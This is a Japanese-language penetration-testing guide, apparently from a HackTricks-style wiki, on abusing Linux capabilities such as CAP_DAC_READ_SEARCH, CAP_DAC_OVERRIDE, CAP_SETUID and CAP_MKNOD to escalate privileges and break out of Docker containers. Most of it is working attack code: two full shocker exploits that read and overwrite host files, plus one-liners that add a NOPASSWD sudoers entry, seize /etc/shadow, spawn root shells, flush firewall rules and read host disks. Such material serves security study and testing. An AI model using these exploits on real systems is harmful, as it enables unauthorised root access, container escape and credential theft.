この technique の別の例は、[https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) にあります。

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、process が**file の読み取り、および directory の読み取りと実行に関する permission を bypass する**ことを可能にします。主な用途は、file の検索または読み取りです。ただし、process が `open_by_handle_at(2)` function を使用することも可能にします。この function は、process の mount namespace 外にある file を含む、あらゆる file にアクセスできます。`open_by_handle_at(2)` で使用される handle は、`name_to_handle_at(2)` によって取得される non-transparent な identifier であることが想定されていますが、改ざんに対して脆弱な inode number などの機密情報を含む場合があります。特に Docker container の context における、この capability の exploit の可能性は、Sebastian Krahmer による shocker exploit によって実証されており、[こちら](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)で分析されています。<sup>[[12]](#references)[[13]](#references)</sup>
**これは、file の読み取り permission check と directory の読み取り・実行 permission check を** **bypass できることを意味します。**

**binary の例**

binary はあらゆる file を読み取れるようになります。そのため、tar のような file にこの capability がある場合、shadow file を読み取ることができます。
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**binary2を使ったExample**

この場合、**`python`** binary にこの capability があるとします。root files を一覧表示するには、次のように実行できます。
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
また、ファイルを読み取るには次のようにします:
```python
print(open("/etc/shadow", "r").read())
```
**環境内の例（Docker breakout）**

以下を使用して、docker container 内で有効な capabilities を確認できます。
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力では、**DAC_READ_SEARCH** capability が有効になっていることが確認できます。その結果、container は**プロセスを debug**できます。

以下の exploit の仕組みについては、[https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)で学ぶことができますが、要約すると、**CAP_DAC_READ_SEARCH**は permission check なしで file system を横断できるだけでなく、_**open_by_handle_at(2)**_ に対するあらゆる check を明示的に削除し、**他の process によって open された sensitive file に process からアクセスできる可能性があります**。<sup>[[13]](#references)</sup>

この permission を悪用して host から file を読み取る original exploit は、[http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)にあります。以下は、**読み取りたい file を第1引数で指定し、その内容を file に dump できる modified version です。**<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> exploit は host 上で mount されているものへの pointer を見つける必要があります。元の exploit ではファイル `/.dockerinit` を使用していましたが、この modified version では `/etc/hostname` を使用します。exploit が動作しない場合は、別のファイルを設定する必要があるかもしれません。host 上で mount されているファイルを見つけるには、mount command を実行します。

![CAP SYS MODULE - CAP DAC READ SEARCH: exploit は host 上で mount されているものへの pointer を見つける必要があります。元の exploit ではファイル /.dockerinit を使用していましたが、この modified version では...](<../../images/image (407) (1).png>)

**この technique の code は、** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)** の「Abusing DAC_READ_SEARCH Capability」laboratory からコピーされています。**<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**これは、あらゆるファイルに対する write permission checks を bypass できるという意味なので、任意のファイルに書き込めます。**

**privileges を escalate するために overwrite できるファイルは多数あります。**[**ここからアイデアを得られます**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**binary の例**

この例では vim にこの capability があるため、_passwd_、_sudoers_、または _shadow_ などの任意のファイルを変更できます。
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**バイナリを使った例 2**

この例では、**`python`** バイナリにこの capability が付与されています。python を使用して、任意のファイルを上書きできます。
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**environment + CAP_DAC_READ_SEARCH の例（Docker breakout）**

Docker container 内で有効な capabilities は、次のコマンドで確認できます。
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
まず、ホスト上の[**DAC_READ_SEARCH capabilityを悪用して任意のファイルを読み取る**](linux-capabilities.md#cap_dac_read_search)前のセクションを読み、**exploitをcompile**してください。\
次に、ホストのファイルシステム内に**任意のファイルを書き込める**ようにする、以下のバージョンの**shocker exploitをcompile**してください：
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Docker containerから**escape**するには、hostから`/etc/shadow`と`/etc/passwd`ファイルを**download**し、それらに**new user**を**add**して、**`shocker_write`**を使って上書きできます。その後、**ssh**経由で**access**します。

**このtechniqueのcodeは、"Abusing DAC_OVERRIDE Capability"のlaboratoryからコピーしたものです** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)<sup>[[1]](#references)</sup>

## CAP_CHOWN

**これは、任意のファイルのownershipを変更できるという意味です。**

**binaryを使ったExample**

**`python`** binaryにこのcapabilityがあると仮定します。この場合、**shadow**ファイルの**owner**を**change**し、**root password**を**change**して、privilegesをescalateできます。
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
または、**`ruby`** バイナリがこの capability を持っている場合:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**これは、任意のファイルの permission を変更できるということです。**

**バイナリを使った例**

Python にこの capability がある場合、shadow file の permission を変更し、**root password を変更**して、権限昇格できます。
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**これは、作成されたプロセスの effective user id を設定できるという意味です。**

**binary を使った例**

python にこの **capability** がある場合、これを非常に簡単に悪用して root へ privilege escalation できます:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**別の方法:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**これは、作成されたプロセスの有効グループIDを設定できるという意味です。**

**権限を昇格するために overwrite できるファイルは多数あります。** [**ここからアイデアを得られます**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**バイナリの例**

この場合、任意のグループになりすませるため、グループが読み取り可能な興味深いファイルを探す必要があります。
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
abuseできるファイル（読み取りまたは書き込みによって）を見つけたら、以下を使って **interesting groupを偽装するshellを取得**できます：
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
この場合、shadow グループになりすますことで、`/etc/shadow` ファイルを読み取れます:
```bash
cat /etc/shadow
```
### Combined chain: CAP_SETGID + CAP_CHOWN

同じ helper で両方の capabilities が利用可能な場合、実用的な chain は次のとおりです。

1. EGID を `shadow`（または別の privileged group）に切り替える。
2. `/etc/shadow` に対して `chown` を使用し、group を `shadow` のまま UID を自分の UID に設定する。
3. target hash を読み取り、crack/pivot する。
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
これにより、直接完全な root 権限を必要とせず、credential reuse を介した pivoting に十分なケースが多くあります。

**docker** がインストールされている場合、**docker group** を **impersonate** し、それを悪用して [**docker socket** と通信し、privileges を escalate](#writable-docker-socket) できます。

## CAP_SETFCAP

**これは、files と processes に capabilities を設定できることを意味します**

**binary の例**

python にこの **capability** がある場合、それを非常に簡単に悪用して privileges を root まで escalate できます：
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> CAP_SETFCAP を使って binary に新しい capability を設定すると、この cap を失うことに注意してください。

[SETUID capability](linux-capabilities.md#cap_setuid) を取得したら、そのセクションで privilege escalation の方法を確認できます。

**Example with environment (Docker breakout)**

デフォルトでは、Docker の **container 内の process には CAP_SETFCAP capability が付与されています**。次のように実行して確認できます:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
この capability により、**バイナリに他の任意の capability を付与できる**ため、このページで説明している**他の capability breakout を悪用して**コンテナから**escaping**できるのではないかと考えられます。\
しかし、たとえば gdb バイナリに CAP_SYS_ADMIN と CAP_SYS_PTRACE の capability を付与しようとすると、付与自体はできますが、その後**バイナリを実行できなくなります**：
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[docsより](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: これは、threadが引き受けることのできる effective capabilities の**制限付きスーパーセット**です。また、effective set に **CAP_SETPCAP** capability を**持たない**threadによって inheritable set に追加できる capabilities の制限付きスーパーセットでもあります。_\
Permitted capabilities は、使用できる capabilities を制限しているようです。\
しかし、Docker はデフォルトで **CAP_SETPCAP** も付与するため、**inheritable set に新しい capabilities を設定**できる可能性があります。\
ただし、この cap のドキュメントには次のように記載されています: _CAP_SETPCAP : \[…] **calling thread の bounding set にある任意の capability を、その inheritable set に追加する**。_\
つまり、inheritable set に追加できるのは bounding set にある capabilities だけのようです。したがって、**権限昇格のために CAP_SYS_ADMIN や CAP_SYS_PTRACE のような新しい capabilities を inherit set に追加することはできません**。

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、`/dev/mem`、`/dev/kmem`、`/proc/kcore` へのアクセス、`mmap_min_addr` の変更、`ioperm(2)` および `iopl(2)` system calls へのアクセス、さまざまな disk commands など、多数のセンシティブな操作を提供します。`FIBMAP ioctl(2)` もこの capability によって有効になりますが、これは[過去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)に問題を引き起こしたことがあります。man page によると、これは holder が `他のデバイス上でデバイス固有のさまざまな操作を実行する`ことも可能にします。

これは**権限昇格**や **Docker breakout** に役立つ可能性があります。

## CAP_KILL

**これは、任意の process を kill できるという意味です。**

**binary を使った Example**

**`python`** binary がこの capability を持っているとします。**service または socket の設定**（あるいは service に関連する任意の設定ファイル）を変更することもできるなら、それを backdoor 化し、その後その service に関連する process を kill して、新しい設定ファイルが backdoor とともに実行されるのを待つことができます。
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**kill による Privesc**

kill capabilities があり、**root として実行されている node program**（または別の user として実行されているもの）がある場合、おそらくその **signal SIGUSR1** を **send** して、**node debugger** を **open** させ、そこへ connect できます。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**これは、任意のポート（特権ポートも含む）でlistenできるということです。** このcapabilityだけでは、直接privilege escalationすることはできません。

**binaryを使った例**

**`python`**にこのcapabilityがある場合、任意のポートでlistenでき、そこから他の任意のポートへ接続することもできます（一部のserviceでは、特定の特権ポートからの接続が必要です）。

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability は、process が **RAW および PACKET sockets を作成**できるようにし、任意の network packets を生成して送信できるようにします。これにより、packet spoofing、traffic injection、network access controls の回避など、containerized environments における security risks につながる可能性があります。悪意のある攻撃者は、これを悪用して container の routing に干渉したり、特に十分な firewall protections がない場合に host network security を侵害したりする可能性があります。さらに、**CAP_NET_RAW** は、RAW ICMP requests による ping などの操作を privileged containers でサポートするために重要です。

**これは traffic を sniff できるということです。** この capability だけで直接 privileges を escalate することはできません。

**Example with binary**

binary **`tcpdump`** にこの capability がある場合、network information を capture できます。
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
**binary 2を使用した例**

以下の例は、"**lo**"（**localhost**）interfaceのtrafficをinterceptするのに役立つ **`python2`** codeです。このcodeは、[https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)<sup>[[1]](#references)</sup> のlab "_The Basics: CAP-NET_BIND + NET_RAW_" からのものです。
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability は、公開されている network namespaces 内で、firewall settings、routing tables、socket permissions、network interface settings などの **network configurations を変更する**権限を holder に付与します。また、network interfaces の **promiscuous mode** を有効化できるため、namespaces 全体で packet sniffing が可能になります。

**Example with binary**

例えば、**python binary** にこれらの capabilities が付与されているとします。
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**これは、inode属性を変更できることを意味します。** このcapabilityだけで直接privilegesをescalateすることはできません。

**binaryを使用した例**

ファイルがimmutableで、pythonにこのcapabilityがある場合、**immutable属性を削除してファイルを変更可能にできます。**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!TIP]
> 通常、この immutable attribute は以下を使用して設定および削除します:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は `chroot(2)` system call の実行を可能にします。これにより、既知の脆弱性を利用して `chroot(2)` environments から escape できる可能性があります:<sup>[[11]](#references)</sup>

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、system restart 用の `reboot(2)` system call の実行を可能にするだけでなく、特定の hardware platforms 向けに調整された `LINUX_REBOOT_CMD_RESTART2` などの specific commands も実行できます。また、新しい crash kernels または signed crash kernels をそれぞれロードするために、`kexec_load(2)` および Linux 3.17 以降では `kexec_file_load(2)` も使用できます。

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は Linux 2.6.37 で、より広範な **CAP_SYS_ADMIN** から分離され、具体的には `syslog(2)` call を使用する権限を付与します。この capability により、`kptr_restrict` setting が 1 の場合に、`/proc` および類似の interfaces を通じて kernel addresses を表示できます。`kptr_restrict` は kernel addresses の公開範囲を制御します。Linux 2.6.39 以降、`kptr_restrict` の default は 0 です。つまり kernel addresses は公開されますが、security 上の理由から、多くの distributions はこれを 1 (uid 0 以外には addresses を隠す) または 2 (常に addresses を隠す) に設定しています。

さらに、`dmesg_restrict` が 1 に設定されている場合、**CAP_SYSLOG** により `dmesg` output にアクセスできます。これらの変更にもかかわらず、過去の経緯により、**CAP_SYS_ADMIN** は引き続き `syslog` operations を実行できます。

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、通常の files、FIFOs (named pipes)、または UNIX domain sockets の作成にとどまらず、`mknod` system call の機能を拡張します。具体的には、以下を含む special files の作成を可能にします:

- **S_IFCHR**: Character special files。terminals などの devices。
- **S_IFBLK**: Block special files。disks などの devices。

この capability は、device files を作成する必要がある processes に不可欠であり、character または block devices を通じた hardware への直接 interaction を可能にします。

これは default docker capability です ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))。

この capability により、以下の conditions 下で host 上の privilege escalations (full disk read による) が可能になります:<sup>[[7]](#references)</sup>

1. Host への initial access を持っている (Unprivileged)。
2. Container への initial access を持っている (Privileged (EUID 0) かつ effective `CAP_MKNOD`)。
3. Host と container が同じ user namespace を共有している。

**Container 内で Block Device を作成して Access する手順:**

1. **Standard User として Host 上で:**

- `id` を使用して current user ID を確認します。例: `uid=1000(standarduser)`。
- Target device を特定します。例: `/dev/sdb`。

2. **`root` として Container 内で:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **ホストに戻って:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
このアプローチにより、標準ユーザーは、共有 user namespace とデバイスに設定された権限を悪用し、container を介して `/dev/sdb` にアクセスし、場合によってはデータを読み取ることができます。

### CAP_SETPCAP

**CAP_SETPCAP** は、ある process が別の process の **capability sets を変更**できるようにし、effective、inheritable、permitted sets への capability の追加または削除を可能にします。ただし、process が変更できるのは、自身の permitted set に保持している capability に限られるため、自身の権限を超えて別の process の権限を昇格させることはできません。最近の kernel の更新では、これらのルールが厳格化され、`CAP_SETPCAP` は自身または子孫の permitted sets 内の capability を減少させることだけに制限されています。これは security risks の軽減を目的としています。使用するには、effective set に `CAP_SETPCAP` があり、対象となる capability が permitted set に含まれている必要があります。変更には `capset()` を使用します。これは、privilege management と security enhancement における `CAP_SETPCAP` の中核的な機能と制限をまとめたものです。

**`CAP_SETPCAP`** は、ある process が **別の process の capability sets を変更**できるようにする Linux capability です。別の process の effective、inheritable、permitted capability sets に対して、capability を追加または削除する機能を提供します。ただし、この capability の使用には一定の制限があります。

